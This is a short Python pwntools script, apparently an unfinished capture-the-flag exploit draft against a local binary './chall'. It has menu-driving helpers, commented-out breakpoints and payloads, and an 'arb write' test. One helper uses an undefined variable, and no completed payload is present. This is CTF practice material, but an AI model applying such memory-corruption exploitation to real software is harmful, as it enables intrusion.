from pwn import *

#context.log_level = 'debug'
exe = ELF("./chall")
libc = ELF("./libc-2.31.so")
#ld = ELF("./ld-2.31.so")
local_bin = "./chall"

#p = gdb.debug(local_bin, '''
#    b *0x555555555358
#    b *0x555555555364 
#    b *0x55555555549C
#    b *0x55555555538a
#    b *0x5555555553D3  
#    b *0x55555555533D
#    b *0x555555555480
#    b *0x5555555552E1
#    continue
#    ''')
p = exe.process()

def write2local(content):
    p.sendlineafter(b'>', b'0')
    p.sendafter(b'content?', content)

def write2stdout(content):
    #trying to do shit to the scan menu because it actually scans 0x10 bytes (??)
    #menu_bar = p64(0x33)
    #menu_bar += p64(0x4141414141414141)
    p.sendlineafter(b'>', menu_bar)
    p.sendafter(b'content?', content)

def write2alloc(content):
    p.sendlineafter(b'>', b'1')
    p.sendafter(b'content?', content)

def write2null(content):
    p.sendlineafter(b'>', b'2')
    p.sendafter(b'content?', content)

#write2stdout(b'aaaaaaaaaaaaaaaa')
#
#payload = p64(0x4242424242424242)
#payload += p64(0x4242424242424242)
#payload += p64(0x4242424242424242)
#write2alloc(payload)

#arb write
write2alloc(b'aaaaaaaaaaaaaaaaaa\n')  
#write2local(b'B' * 0x19)    #  #0x7fffffffe360
gdb.attach(p)
#write2alloc(b'aaaaaaaaaaaaaaaaaa')

#write2stdout(b'a' * 0x1F)       #0x7fffffffe350
#write2stdout(b'a' * 0x1F)       #0x7fffffffe350

p.interactive()